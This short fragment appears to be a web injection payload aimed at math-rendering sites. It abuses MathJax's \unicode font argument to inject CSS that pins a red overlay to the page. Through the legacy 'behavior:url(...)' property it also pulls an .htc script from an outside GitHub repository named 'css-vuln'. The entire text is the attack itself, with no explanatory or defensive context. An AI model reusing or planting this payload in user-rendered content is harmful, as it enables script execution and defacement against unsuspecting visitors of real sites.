...
\ce{$\unicode[goombafont; color:red; z-index: 1000; position: fixed; right: 2vh; bottom: 0; background-repeat: no-repeat; height: 249px; object-fit: cover; width: 213px; behavior:url('https://github.com/tr4xnz/css-vuln/raw/main/script.htc');
